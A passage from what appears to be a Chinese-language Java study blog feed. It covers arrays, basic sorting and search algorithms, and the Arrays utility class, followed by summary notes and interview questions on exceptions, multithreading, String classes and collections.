<li>声明与初始化<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[][] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="comment">//动态初始化 数组变量的赋值和数组元素的赋值分开进行，如下是对数组变量的赋值</span></span><br><span class="line"><span class="type">int</span>[][] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span>[][] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][];<span class="comment">//没有指定内层，后续需要arr3[0] = new int[4];来分配</span></span><br><span class="line"><span class="comment">//其他正确写法 不用但了解</span></span><br><span class="line"><span class="type">int</span> arr4[][] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span>[] arr5[] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> arr6[][] = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> arr7[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">4</span>];</span><br></pre></td></tr></table></figure></li>
<li>数组元素的调用和数组遍历<ul>
<li>.length找到的是外层数组数，如上述arr2.length &#x3D; 3</li>
<li>嵌套循环遍历多层数组。</li>
</ul>
</li>
<li>多维数组的默认初始值<ul>
<li>针对动态初始化方式1<ul>
<li>外层元素默认值为虚拟地址</li>
<li>内层元素默认值与一维数组相同</li>
</ul>
</li>
<li>针对动态初始化方式2<ul>
<li>外层元素默认值为null</li>
<li>内层元素不存在，调用会报错</li>
</ul>
</li>
</ul>
</li>
<li>多维数组的内存空间<ul>
<li>Java的多维数组和C,C++不同之处在于不需要对齐，不是行列相同的，内层数组可能有不同数量的元素，例如 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] arr0 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][];</span><br><span class="line">arr0[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line">arr0[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//arr0[0].length = 5;arr0[1].length = 3;</span></span><br></pre></td></tr></table></figure></li>
<li><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240623001309.png" alt="示例1"></li>
<li><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240622235508.png" alt="示例2"></li>
</ul>
</li>
<li>总结<ul>
<li>数组之间相互赋值必须满足类型提升或是相同的类型</li>
</ul>
</li>
</ol>
<h3 id="数组的常用算法"><a href="#数组的常用算法" class="headerlink" title="数组的常用算法"></a>数组的常用算法</h3><h4 id="数组特征值求解"><a href="#数组特征值求解" class="headerlink" title="数组特征值求解"></a>数组特征值求解</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/<span class="number">3.1</span> 求最大值</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(max &lt; arr[i])&#123;</span><br><span class="line">                max = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最大值为：&quot;</span> + max);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.2 求最小值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(min &gt; arr[i])&#123;</span><br><span class="line">                min = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最小值为：&quot;</span> + min);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.3 求总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j : arr) &#123;</span><br><span class="line">            sum += j;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;总和为：&quot;</span> + sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.4 求平均值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">avgValue</span> <span class="operator">=</span> sum / arr.length;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均值为：&quot;</span> + avgValue);</span><br></pre></td></tr></table></figure>

<h4 id="数组的反转-扩容-缩容"><a href="#数组的反转-扩容-缩容" class="headerlink" title="数组的反转 扩容 缩容"></a>数组的反转 扩容 缩容</h4><ol>
<li>由于数组地址是连续的，而原数组后的空间可能已经被使用，因此扩容相当于新创一个更大数组并复制原数组数据</li>
<li>同时由于数组一旦初始化，其大小就固定，所以扩容缩容都需要新建数组</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反转</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>,j = arr.length - <span class="number">1</span>;i &lt; j;i++,j--)&#123;</span><br><span class="line">    <span class="comment">//交互arr[i] 与 arr[j]位置的元素</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//扩容</span></span><br><span class="line"><span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="comment">// 扩容1倍</span></span><br><span class="line"><span class="type">int</span>[] newArr1 = <span class="keyword">new</span> <span class="title class_">int</span>[arr1.length &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">    newArr1[i] = arr1[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//也可以使用System.arraycopy(arr1, 0, newArr1, 0, arr1.length);直接复制</span></span><br><span class="line">arr1 = newArr1;</span><br><span class="line"><span class="comment">// 将新的数组的地址赋给原有数组变量，然后待下一次内存清理时会清理arr1原来的空间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缩容</span></span><br><span class="line"><span class="comment">// 方法1，不改变实际大小，仅改变元素</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> deleteIndex;i &lt; arr.length - <span class="number">1</span>;i++)&#123;</span><br><span class="line">    arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改最后元素,设置为默认值</span></span><br><span class="line">arr[arr.length - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2，新建数组</span></span><br><span class="line"><span class="type">int</span>[] newArr = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; deleteIndex; i++) &#123;</span><br><span class="line">    newArr[i] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> deleteIndex;i &lt; arr.length - <span class="number">1</span>;i++)&#123;</span><br><span class="line">    newArr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr = newArr;</span><br></pre></td></tr></table></figure>

<h4 id="数组的查找与排序-待补充"><a href="#数组的查找与排序-待补充" class="headerlink" title="数组的查找与排序 待补充"></a>数组的查找与排序 待补充</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二分法查找 适用于有序数组，无序数组使用遍历的线性查找</span></span><br><span class="line"><span class="type">int</span>[] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">26</span>,<span class="number">37</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">66</span>,<span class="number">89</span>,<span class="number">100</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">head</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//默认的首索引</span></span><br><span class="line"><span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> arr2.length - <span class="number">1</span>;<span class="comment">//默认的尾索引</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">false</span>;<span class="comment">//判断是否找到了指定元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(head &lt;= end)&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">middle</span> <span class="operator">=</span> (head + end) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(target == arr2[middle])&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;找到了&quot;</span> + target + <span class="string">&quot;,对应的位置为：&quot;</span> + middle);</span><br><span class="line">        isFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(target &gt; arr2[middle])&#123;</span><br><span class="line">        head = middle + <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//target &lt; arr2[middle]</span></span><br><span class="line">        end = middle - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isFlag)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;不好意思，未找到&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排 序算法</span></span><br><span class="line"><span class="comment">// 冒泡排序，实现数组元素从小到大排列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j &lt; arr.length - <span class="number">1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span> - j; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i] &gt; arr[i + <span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="comment">//交互arr[i] 和 arr[i + 1]</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">                    arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">                    arr[i + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 快速排序 每次取中间，小于放前，大于放后，O(nlogn) 可以直接调用，最快</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆排序</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/1d43762b58681c0ace7caa3fa93b33da.gif" alt="快速排序示意图"></p>
<h3 id="数组工具类Arrays的常用方法"><a href="#数组工具类Arrays的常用方法" class="headerlink" title="数组工具类Arrays的常用方法"></a>数组工具类Arrays的常用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//比较数组是否相等</span></span><br><span class="line">Arrays.equals(arr1,arr2);</span><br><span class="line"><span class="comment">// 查看数组的全部内容，返回值是字符串</span></span><br><span class="line">Arrays.toString(arr1);</span><br><span class="line"><span class="comment">//将指定值填充到数组之中。</span></span><br><span class="line">Arrays.fill(arr1,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//使用快速排序算法实现的排序</span></span><br><span class="line">Arrays.sort(arr1);</span><br><span class="line"><span class="comment">//二分查找元素，必须是有序数组才能使用</span></span><br><span class="line">Arrays.binarySearch(arr3,<span class="number">15</span>);</span><br></pre></td></tr></table></figure>

<h3 id="静态数组和实例数组的区别"><a href="#静态数组和实例数组的区别" class="headerlink" title="静态数组和实例数组的区别"></a>静态数组和实例数组的区别</h3><p>类内方法外定义数组：<br> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">double</span>[] number0;</span><br><span class="line"><span class="comment">// 静态初始化，数值通过静态方法改变</span></span><br><span class="line"><span class="keyword">static</span>&#123;number0 = <span class="keyword">new</span> <span class="title class_">double</span>[]&#123;<span class="number">20.11</span>,<span class="number">20.1</span>,<span class="number">20.3</span>&#125;;&#125;</span><br><span class="line"><span class="comment">// 声明+动态初始化</span></span><br><span class="line"><span class="type">int</span>[] number1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//可以省略为</span></span><br><span class="line"><span class="type">int</span>[] number2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//类型推断</span></span><br></pre></td></tr></table></figure></p>
<p>声明方式：<br>    number0是一个静态（static）的double数组。因为它是静态的，所以它与类ArrayTest本身相关联，而不是与类的任何特定实例相关联。这意味着无论创建了多少个ArrayTest的实例，number0都只有一个副本，且所有实例都可以访问和修改它（除非被final关键字修饰为不可变）。<br>    number1是一个实例（非静态）的int数组。它与ArrayTest的每一个实例相关联。每当创建一个新的ArrayTest实例时，都会为该实例分配一个新的、独立的number1数组。这意味着每个实例都有自己的number1数组副本，并且一个实例不能访问或修改另一个实例的number1数组。<br>生命周期：<br>    静态变量（如number0）的生命周期与类本身相同。当类被加载到Java虚拟机（JVM）时，静态变量会被初始化，并且只要类保持被加载的状态，它们就会一直存在。静态变量在程序结束或类被卸载时才会被销毁。<br>    实例变量（如number1）的生命周期与对象实例相同。当创建一个新的对象实例时，它的实例变量会被初始化（通过构造方法或其他初始化块），并且只要该对象实例保持可达状态（即没有被垃圾收集器回收），它的实例变量就会一直存在。当对象实例被垃圾收集器回收时，它的实例变量也会被销毁。<br>访问方式：<br>    静态变量可以通过类名直接访问（例如ArrayTest.number0），而无需创建类的实例。<br>    实例变量必须通过类的实例（对象）来访问（例如ArrayTest instance &#x3D; new ArrayTest(); instance.number1）。<br>用途：<br>    静态变量通常用于存储类级别的信息，这些信息在所有实例之间都是共享的。<br>    实例变量用于存储与特定对象实例相关的状态信息。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>常见数组异常</p>
<ol>
<li>数组下标越界异常，java数组下标越界直接报错</li>
<li>空指针异常<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][];</span><br><span class="line">System.out.println(arr[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//没有使用new为内层数组分配空间</span></span><br><span class="line">String[] arr1 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">System.out.println(arr1[<span class="number">0</span>].toString());</span><br><span class="line"><span class="comment">//对象arr1[0]没有值就无法调用其的方法！</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h2><p>需求分析(产品经理) –&gt; 项目设计(项目经理) –&gt; 开发实现(软件开发工程师) –&gt;<br>功能测试(测试工程师) –&gt; 部署实施(运维&#x2F;实施工程师) –&gt; 项目运营&#x2F;项目维护</p>
<p>可以问：负责什么项目，使用什么架构<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240621182222.png" alt="架构"></p>
]]></content>
      <categories>
        <category>Java</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Note5-总结</title>
    <url>/2024/07/15/Java-Note5-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Java知识点和企业面试题</p>
<span id="more"></span>

<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ol>
<li>异常的概述：异常的概念，抛出机制，对待异常的方式(不处理即崩溃)</li>
<li>异常的体系结构：Throwable -&gt; Error,Exception(运行时异常,编译时异常)，常见异常和错误</li>
<li>异常的处理机制：try-catch-finally throws</li>
<li>try-catch-finally throws的具体使用方法，使用时机</li>
<li>手动抛出异常的方法 <code>throw new 异常类的对象</code></li>
<li>自定义异常：继承已有的异常类</li>
</ol>
<h3 id="面试题："><a href="#面试题：" class="headerlink" title="面试题："></a>面试题：</h3><ol>
<li>常见的异常？</li>
<li>java的异常体系简单介绍</li>
<li>java的异常处理机制</li>
<li>异常的两种类型 error和exception的区别</li>
<li>运行时异常和一般异常有什么异同<br>（编译时可以通过，运行时可能抛出，概率高，一般不处理；编译不能通过，编译前必须处理）</li>
<li>try-catch-finally</li>
<li>说说finally final finalize(object中的方法)的区别（毫无联系，阐述各自）</li>
<li>如果不使用try-catch,程序出现异常会如何（如使用throws会向调用者抛，上级不用t-c处理最终都会导致程序执行终止）</li>
<li>try-catch捕获的时什么异常（exception no error）</li>
<li>如果执行了finally代码块之前方法返回了结果或者jvm退出了，这是finally中的还会执行吗（除非之前的代码是system.exit(0)否则都会）</li>
<li>try中有return，最后有finally，finally中的还会不会执行（会），何时执行（）执行在return前还是后（return前(先return返回值（即字节码将返回值移入传参寄存器），然后再finally中代码,最后再是结束方法的return)</li>
<li>throw和throws的区别<br>（使用格式：前者在方法内，通过。。语句；后者在方法声明处，通过。。语句）<br>（作用不同：前者抛异常，后者处理（实际没有处理））</li>
<li>子类重写父类抛出异常的方法，不能抛出比父类更高级别的异常</li>
</ol>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>程序，进程，线程，并发，并行，抢占式调度，单多核CPU的概念</li>
<li>创建多线程的四种方式：<ul>
<li>继承Thread类</li>
<li>实现Runnable接口</li>
<li>实现Callable接口(JUC学)</li>
<li>使用线程池</li>
</ul>
</li>
<li>Thread类常用方法（了解）</li>
<li>线程的生命周期</li>
<li>线程的安全问题和解决(重难点)<ul>
<li>同步机制（同步代码块，同步方法）</li>
<li>Lock接口及其实现类</li>
<li>主要是共享数据和操作共享数据的代码</li>
</ul>
</li>
<li>懒汉式的线程安全写法</li>
<li>死锁的条件及其规避</li>
<li>线程的通信，wait(),notify(),同步监视器</li>
</ol>
<h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><ol>
<li>什么是线程</li>
<li>线程和进程有什么区别（运行中的进程的一条或多条路径；对应一个运行中的程序）</li>
<li>多线程的使用场景（手机app应用图片下载，迅雷下载，Tomcat服务器上多个客户端发起请求时）</li>
<li>如何实现多线程</li>
<li>start()和run()有什么区别(start()开启线程并调用线程的run()方法)</li>
<li>Callable和Runnable的区别</li>
<li>什么是线程池，为什么使用</li>
<li>sleep()和yield()的区别（一旦调用进入阻塞(或TIMED_WAITING)，后者释放cpu的执行权，处于RUNNABLE的状态）</li>
<li>线程创建中的方法属性</li>
<li>线程的生命周期</li>
<li>stop()和suspend为什么不推荐（一旦执行，线程结束，导致run()有未执行结束的代码，释放同步监视器，导致线程安全问题；死锁）</li>
<li>线程安全问题及其原因</li>
<li>如何保证线程安全</li>
<li>synchronized加在静态方法和普通方法上的区别（同步监视器不同，前者当前类，后者this）</li>
<li>一个线程进入一个对象的sy..方法后其他线程是否可以进入此对象的其他方法（取决其他方法是否有用sy..修饰且使用同一个同步监视器）</li>
<li>线程同步与阻塞的关系：同步一定阻塞，阻塞不一定同步</li>
<li>死锁及其条件</li>
<li>notify()和notifyAll()</li>
<li>为什么wait()和notify()必须在同步时才能调用（同步监视器调用）</li>
<li>安全的单例模式</li>
</ol>
<p><strong>区分sleep()和wait()</strong><br>相同点：一旦执行，都会使得当前线程结束执行状态，进入阻塞状态。<br>不同点：</p>
<ol>
<li>定义方法所属的类：sleep():Thread中定义。  wait():Object中定义</li>
<li>使用范围的不同：sleep()可以在任何需要使用的位置被调用； wait():必须使用在同步代码块或同步方法中</li>
<li>都在同步结构中使用的时候，是否释放同步监视器的操作不同：sleep():不会释放同步监视器 ;wait():会释放同步监视器</li>
<li>结束等待的方式不同：sleep()：指定时间一到就结束阻塞。 wait():可以指定时间也可以无限等待直到notify或notifyAll。</li>
</ol>
<p>栈管运行，堆管存储</p>
<h2 id="常用类和API"><a href="#常用类和API" class="headerlink" title="常用类和API"></a>常用类和API</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>String类<ul>
<li>String的声明：final修饰、实现了Comparable接口</li>
<li>String的不可变性</li>
<li>String的两种定义方式：① 字面量的定义方式 String s &#x3D; “hello” ② new 的方式：String s &#x3D; new String(“hello”);<ul>
<li>String的内存解析：字符串常量池、堆内存的使用</li>
<li>String s &#x3D; new String(“hello”);在内存中创建的对象的个数。</li>
</ul>
</li>
<li>String的连接操作：+<ul>
<li>常量 + 常量 、变量 + 常量 、变量+变量、concat(String otherString)</li>
<li>String intern()</li>
</ul>
</li>
<li>熟悉String的构造器、与其他结构之间的转换、常用方法<ul>
<li>编码和解码<ul>
<li>编码：字符、字符串 –&gt; 字节、字节数组。对应着编码集</li>
<li>解码：字节、字节数组 –&gt; 字符、字符串。对应着解码集</li>
<li>规则：解码集必须使用当初编码时使用的编码集。只要不一致，就可能出现乱码！</li>
</ul>
</li>
</ul>
</li>
<li>String相关的算法问题。</li>
</ul>
</li>
<li>StringBuffer、StringBuilder类<ul>
<li>[面试题]String、StringBuffer、StringBuilder的区别</li>
<li>知道什么场景下使用StringBuffer、StringBuilder</li>
</ul>
</li>
<li>jdk8之前的日期、时间API<ul>
<li>System的currentTimeMillis()</li>
<li>两个Date的使用</li>
<li>SimpleDateFormat用于格式化、解析</li>
<li>Calendar日历类的使用</li>
</ul>
</li>
<li>jdk8中新的日期、时间API<ul>
<li>LocalDate、LocalTime、LocalDateTime –&gt;类似于Calendar</li>
<li>Instant  –&gt;类似于Date</li>
<li>DateTimeFormatter —&gt;类似于SimpleDateFormat</li>
</ul>
</li>
<li>比较器(重点)<ul>
<li>自然排序涉及到Comparable<ul>
<li>compareTo(Object obj)</li>
</ul>
</li>
<li>定制排序涉及到Comparator<ul>
<li>compare(Object obj1,Object obj2)</li>
</ul>
</li>
</ul>
</li>
<li>其它API</li>
</ol>
<h3 id="面试题-1"><a href="#面试题-1" class="headerlink" title="面试题"></a>面试题</h3><ol>
<li>以下两种方式创建的String对象有什么不同？ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure></li>
<li>String s &#x3D; new String(“xyz”);创建了几个String Object? （两个）</li>
<li>String a&#x3D;”abc” String b&#x3D;”a”+”bc” 问a&#x3D;&#x3D;b?（是）</li>
<li>String 中 “+” 怎样实现?<br> 常量 + 常量 ：略<br> 变量 + 常量 、变量+变量：创建一个StringBuilder的实例，通过append()添加字符串，最后调用toString()返回一个字符串。（toString()内部new 一个String的实例）</li>
<li>Java中String是不是final的？（是）</li>
<li>String为啥不可变，在内存中的具体形态？（规定不可变。String：提供字符串常量池。）</li>
<li>String 可以在 switch中使用吗?（可以。从jdk7开始可以使用）</li>
<li>String中有哪些方法?列举几个</li>
<li>subString()到底做了什么?String str &#x3D; “hello”;<br>String subStr &#x3D; str.subString(1,3);  &#x2F;&#x2F;底层是new的方式返回一个subStr，实体内容是”el”</li>
<li>Java中操作字符串有哪些类？他们之间有什么区别<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; String:不可变的字符序列;底层使用char[] （jdk8及之前），底层使用byte[] （jdk9及之后）</span><br><span class="line">&gt; StringBuffer:可变的字符序列;JDK1.0声明，线程安全的，效率低;底层使用char[] （jdk8及之前），底层使用byte[] （jdk9及之后）</span><br><span class="line">&gt; StringBuilder:可变的字符序列;JDK5.0声明，线程不安全的,效率高;底层使用char[] （jdk8及之前），底层使用byte[] （jdk9及之后）</span><br></pre></td></tr></table></figure></li>
<li>String的线程安全问题</li>
<li>StringBuilder和StringBuffer的线程安全问题</li>
<li>简单说说 Comparable 和 Comparator 的区别和场景？</li>
<li>Comparable 接口和 Comparator 接口实现比较</li>
</ol>
<h2 id="集合框架"><a href="#集合框架" class="headerlink" title="集合框架"></a>集合框架</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p><strong>数组存储数据方面的特点和弊端</strong></p>
<p>数组存储多个数据方面的特点：</p>
<blockquote>
<p>数组一旦初始化，其长度就是确定的。<br>数组中的多个元素是依次紧密排列的，有序的，可重复的<br>(优点) 数组一旦初始化完成，其元素的类型就是确定的。不是此类型的元素，就不能添加到此数组中。<br>    int[] arr &#x3D; new int[10];<br>    arr[0] &#x3D; 1;<br>    arr[1] &#x3D; “AA”;&#x2F;&#x2F;编译报错</p>
</blockquote>
<pre><code>Object[] arr1 = new Object[10];
arr1[0] = new String();
arr1[1] = new Date();
</code></pre>
<blockquote>
<p>(优点)元素的类型既可以是基本数据类型，也可以是引用数据类型。</p>
</blockquote>
<p>数组存储多个数据方面的弊端：</p>
<blockquote>
<p>数组一旦初始化，其长度就不可变了。<br>数组中存储数据特点的单一性。对于无序的、不可重复的场景的多个数据就无能为力了。<br>数组中可用的方法、属性都极少。具体的需求，都需要自己来组织相关的代码逻辑。<br>针对于数组中元素的删除、插入操作，性能较差。</p>
</blockquote>
<p><strong>集合框架概述</strong><br>java.util.Collection:存储一个一个的数据<br>    |—–子接口：List:存储有序的、可重复的数据 (“动态”数组)<br>           |—- ArrayList(主要实现类)、LinkedList、Vector</p>
<pre><code>|-----子接口：Set:存储无序的、不可重复的数据(高中学习的集合)
       |---- HashSet(主要实现类)、LinkedHashSet、TreeSet
</code></pre>
<p>java.util.Map:存储一对一对的数据(key-value键值对，(x1,y1)、(x2,y2) –&gt; y&#x3D;f(x),类似于高中的函数)<br>    |—- HashMap(主要实现类)、LinkedHashMap、TreeMap、Hashtable、Properties</p>
<p><strong>Collection的常用方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(Object obj)</span><br><span class="line">addAll(Collection coll)</span><br><span class="line">clear()</span><br><span class="line">isEmpty()</span><br><span class="line">size()</span><br><span class="line">contains(Object obj)</span><br><span class="line">containsAll(Collection coll)</span><br><span class="line">retainAll(Collection coll)</span><br><span class="line">remove(Object obj)</span><br><span class="line">removeAll(Collection coll)</span><br><span class="line">hashCode()</span><br><span class="line">equals()</span><br><span class="line">toArray()</span><br><span class="line">**************</span><br><span class="line">iterator() ---&gt; 引出了迭代器接口</span><br></pre></td></tr></table></figure>

<p>向Collection中添加元素的要求：</p>
<blockquote>
<p>要求元素所属的类一定要重写equals()!</p>
</blockquote>
<p>集合与数组的相互转换：<br>集合 —&gt; 数组：toArray()<br>数组 —&gt; 集合：调用Arrays的静态方法asList(Object … objs)，返回一个List</p>
<p><strong>迭代器接口</strong></p>
<ul>
<li>设计模式的一种</li>
